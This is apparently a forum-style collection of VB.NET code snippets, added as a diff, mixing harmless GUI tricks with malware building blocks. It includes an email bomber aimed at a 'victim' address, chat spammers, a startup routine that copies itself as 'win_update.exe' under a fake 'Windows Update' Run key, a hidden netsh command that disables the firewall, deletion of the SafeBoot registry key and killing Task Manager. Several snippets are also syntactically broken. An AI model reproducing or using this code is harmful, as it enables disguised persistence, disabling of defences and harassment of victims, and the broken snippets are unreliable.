@@ -1,0 +1,395 @@
+VB.net - Useful Source Codes
+
+
+Open a Website:
+
+Code:
+Process.Start("www.bumpbox.net")
+Process.Start("www.myforum.net")
+Open something
+Code:
+Shell("Notepad")
+Shell("Calculator")
+Delete a file
+Code:
+Dim FileToDelete As String
+FileToDelete = "C:\File.exe"
+If System.IO.File.Exists(FileToDelete) = True Then
+System.IO.File.Delete(FileToDelete)
+
+Kill a process
+Code:
+Dim RunningProcess As System.Diagnostics.Process = Process.GetProcessesByName("taskmgr.exe")(0)
+RunningProcess.Kill()
+Rename a file
+Code:
+My.Computer.FileSystem.RenameFile ("C:\Program Files\Mozilla Firefox\firefox.exe", "Anything.exe")
+Delete a registry key
+Code:
+My.Computer.Registry.LocalMachine.DeleteSubKey("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot")
+Create a registry key
+Code:
+Dim regKey As RegistryKey
+regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE", True)
+regKey.CreateSubKey("MyApp")
+regKey.Close()
+Text To Speech:
+Code:
+Dim sapi
+sapi = CreateObject("sapi.spvoice")
+sapi.Speak(Textbox1.text)
+Fade in
+Code:
+For FadeIn = 0.0 To 1.1 Step 0.1
+Me.Opacity = FadeIn
+Me.Refresh()
+Threading.Thread.Sleep(100)
+Next
+Fade out:
+Code:
+For FadeOut = 90 To 10 Step -10
+Me.Opacity = FadeOut / 100
+Me.Refresh()
+Threading.Thread.Sleep(50)
+Next
+
+Gmail Bomber:
+
+Add a Timer, 5 textboxes, button
+
+textbox1 = Gmail Username
+textbox2 = Gmail Password
+textbox3 = Victim E-mail Address
+textbox4 = Subject
+textbox5 = Message
+button1.text = send!
+
+Add on Top Of “Public Class Form1”
+Code:
+Imports System.Net.Mail
+Double Click Button1 and write:
+Code:
+timer1.start
+then Double click Timer1 and write:
+Code:
+Dim MyMailMessage As New MailMessage()
+MyMailMessage.From = New MailAddress(TextBox1.Text)
+MyMailMessage.To.Add(TextBox3.Text)
+MyMailMessage.Subject = (TextBox4.Text)
+MyMailMessage.Body = TextBox5.Text
+Dim SMTPServer As New SmtpClient("smtp.gmail.com")
+SMTPServer.Port = 587
+SMTPServer.Credentials = New System.Net.NetworkCredential(TextBox1.Text, TextBox2.Text)
+SMTPServer.EnableSsl = True
+SMTPServer.Send(MyMailMessage)
+MsgBox("Email Has been sent Successfully ;)")
+
+
+Info Grabber
+
+Gets OS Name:
+Code:
+Textbox1.text = My.Computer.Info.OSFullName
+Gets OS Version & Build Number:
+Code:
+Textbox2.text = My.Computer.Info.OSVersion
+Gets Total Physical Memory:
+Code:
+Textbox3.text = My.Computer.Info.TotalPhysicalMemory
+Gets Available Physical Memory:
+Code:
+Textbox4.text = My.Computer.Info.AvailablePhysicalMemory
+Gets Clipboard Text:
+Code:
+Textbox5.text = My.Computer.Clipboard.GetTextGets Local Time:
+Code:
+Textbox6.text = My.Computer.Clock.LocalTime
+
+Minimize To Tray
+
+Just Add a Notifyicon
+
+Code:
+Private Sub Form1_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
+
+If Me.WindowState = FormWindowState.Minimized Then
+
+Me.Hide()
+
+End If
+
+End Sub
+
+Private Sub NotifyIcon1_MouseClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles NotifyIcon1.MouseClick
+
+If Me.WindowState = FormWindowState.Minimized Then
+
+Me.Show()
+
+Me.WindowState = FormWindowState.Normal
+
+End If
+
+End Sub
+
+Webbrowser Exampe
+
+Add a Webbrowser
+5 buttons
+1 combobox
+
+Button1 = Back
+Button2 = Forward
+Button3 = Refresh
+Button4 = Stop
+Button5 = Go!
+
+Button1:
+Code:
+Webbrowser1.goback
+Button2:
+Code:
+webbrowser1.goforward
+Button3:
+Code:
+webbrowser1.refresh
+Button4:
+Code:
+webbrowser1.stop
+Button5:
+Code:
+webbrowser1.navigate(combobox1.text)
+Add Music To Your Tool:
+
+First Add your music to Resources
+Note: The File Type Of The Music must be .wav
+
+Double Click Button1 (start):
+Code:
+My.Computer.Audio.Play(My.Resources.song namenowav, AudioPlayMode.BackgroundLoop)
+Double Click Button2 (stop)
+Code:
+My.Computer.Audio.Stop()
+Count Files In Folders:
+Code:
+Dim NOF As Integer
+Dim FilePath As String = TextBox1.Text
+NOF = System.IO.Directory.GetFiles(FilePath).Length
+TextBox2.Text =NOF.ToString
+Google Searcher
+
+Add:
+Process
+Button
+
+Double Click The Button and Write:
+Code:
+Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+If TextBox1.Text = "" Then
+msgbox("WTF :| ? are u searching for nothing o.0 ?)
+Else
+Process1.StartInfo.FileName = (" & TextBox1.Text & "&btnG=Search&meta=")
+Process1.Start()
+End If
+End Sub
+Case Example
+
+Add:
+1 Button
+1 Textbox
+
+Double Click the Button and write:
+Code:
+TextBox1.Text = Int(Rnd() * 4)
+Select Case TextBox1.Text
+Case 0
+TextBox1.Text = "anything"
+Case 1
+TextBox1.Text = "passgenerator"
+Case 2
+TextBox1.Text = "CD key"
+Case 3
+TextBox1.Text = "strings"
+End Select
+Login Example:
+
+Add:
+1 button
+
+Click The Button and write:
+Code:
+If TextBox1.Text = "CodeBreaker" _
+And TextBox2.Text = "TheEndGamer" Then
+MsgBox("Welcome to Bumpbox.net")
+Else
+MsgBox("Euuhh? do i know u :S ?")
+End If
+Xfire Add Friender and status changer (Just an example)
+
+Add:
+2 buttons
+1 webbrowser
+2 textboxes
+
+
+Button1.text = Change Status
+Button2.text = Add Friend
+
+Double Click Button1 and write:
+Code:
+WebBrowser1.Navigate("xfire:status?text= " & TextBox1.Text)
+Double Click Button2 and Write:
+Code:
+WebBrowser1.Navigate("xfire:add_friend?u ser=" & TextBox2.Text)
+Screen Capture:
+
+You Need a large picturebox
+button1 = “Shoot”
+Button2 = “Save”
+Textbox1
+Textbox2
+
+Double Click Button1 and write:
+Code:
+Dim BumpBox As Rectangle
+Dim screenshot As System.Drawing.Bitmap
+Dim graph As Graphics
+BumpBox = Screen.PrimaryScreen.BumpBox
+screenshot = New System.Drawing.Bitmap(BumpBox.Width, BumpBox.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
+graph = Graphics.FromImage(screenshot)
+graph.CopyFromScreen(BumpBox.X, BumpBox.Y, 0, 0, BumpBox.Size, CopyPixelOperation.SourceCopy)
+PictureBox1.Image = screenshot
+Double Click Button2 and write:
+Dim savefile As New System.IO.StreamWriter(“C:\Users" + TextBox1.Text + ”\documents" + TextBox2.Text + “.jpg”)
+savefile.Write(PictureBox1.Image)
+savefile.Close()
+MsgBox(“Pictue Saved :D”, MsgBoxStyle.Exclamation, “Done!”)
+
+Add Your Application To Startup 
+
+Before Public Class Form1
+Add:
+Code:
+Imports System.IO
+Imports Microsoft.Win32
+Now double click form1 and add the following Code:
+
+Code:
+Try
+If System.IO.File.Exists(Path.GetTempPath() & "win_update.exe") = False Then
+System.IO.File.Copy(System.Reflection.Assembly. _
+GetExecutingAssembly.Location, Path.GetTempPath() & "win_update.exe")
+End If
+Catch ex As Exception
+
+End Try
+Try
+Dim regKey As RegistryKey
+regKey = Registry.CurrentUser.OpenSubKey("software\Microsoft\Windows\CurrentVersion\Run", True)
+regKey.SetValue("Windows Update", Path.GetTempPath() & "win_update.exe")
+regKey.Close()
+
+Catch ex As Exception
+
+End Try
+
+Try
+Dim regKey As RegistryKey
+regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+regKey.SetValue("Windows Update", Path.GetTempPath() & "win_update.exe")
+regKey.Close()
+
+Catch ex As Exception
+End Try
+Picture Viewer:
+
+Add:
+1 Button
+1 PictureBox
+
+Double Click Button1 and write:
+Code:
+Try
+OpenFileDialog1.Title = "Open Picture"
+OpenFileDialog1.FileName = ".jpg"
+OpenFileDialog1.Filter = "All Files |*.*" OpenFileDialog1.ShowDialog()
+PictureBox1.Image = System.Drawing.Image.FromFile(OpenFileDi alog1.FileName)
+Catch ex As Exception
+End Try
+Chat Spammer
+
+Add:
+2 Buttons
+1 Timer
+
+Double Click Button1(Start) and write:
+Code:
+timer1.start
+Double Click Button2(Stop) and write:
+Code:
+timer1.stop
+Then… Double Click Timer1 and Write:
+Code:
+SendKeys.Send(TextBox1.Text)
+SendKeys.Send("{ENTER}")
+HotKeyChat Spammer!
+
+Drag a textbox out there follow up with 2 timer’s. Change Timer2 to Enabled = True
+Add 2 labels and change label1.text to Start=F1 and label2.text stop=F2 (or whatever key you choose to use).
+
+Double click timer1 and write:
+Code:
+SendKeys.Send(TextBox1.Text)
+SendKeys.Send("{ENTER}")
+Double click Form1 and write:
+Code:
+Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
+Double click timer2 :
+Code:
+Dim starthotkey As Boolean
+starthotkey = GetAsyncKeyState(Keys.F1)
+If starthotkey = True Then
+Timer1.Start()
+End If
+Dim stophotkey As Boolean
+stophotkey = GetAsyncKeyState(Keys.F2)
+If stophotkey = True Then
+Timer1.Stop()
+End If
+NOTE: you can change GetAsyncKeyState(Keys.<insert new key here>) Ex. Keys.End)
+
+CD-Rom Prank
+Code:
+Do
+Dim oWMP = CreateObject("WMPlayer.OCX.7")
+Dim colCDROMs = oWMP.cdromCollection
+If colCDROMs.Count = 1 Then
+For i = 0 To colCDROMs.Count - 1
+colCDROMs.Item(i).Eject()
+Next ' cdrom
+End If
+Loop
+
+Disable Firewall:
+Code:
+Dim Bumpbox As Process = New Process
+Dim top As String = "netsh.exe"
+Bumpbox.StartInfo.Arguments = ("firewall set opmode disable")
+Bumpbox.StartInfo.FileName = top
+Bumpbox.StartInfo.UseShellExecute = False
+Bumpbox.StartInfo.RedirectStandardOutput = True
+Bumpbox.StartInfo.CreateNoWindow = True
+Bumpbox.Start()
+Bumpbox.WaitForExit()
+
+Shutdown Manager:
+
+Shutdown:
+Code:
+Shell("Shutdown -s")
+Restart:
+Code:
+Shell("Shutdown -r")
+LogOff:
+Code:
+Shell("Shutdown -l")
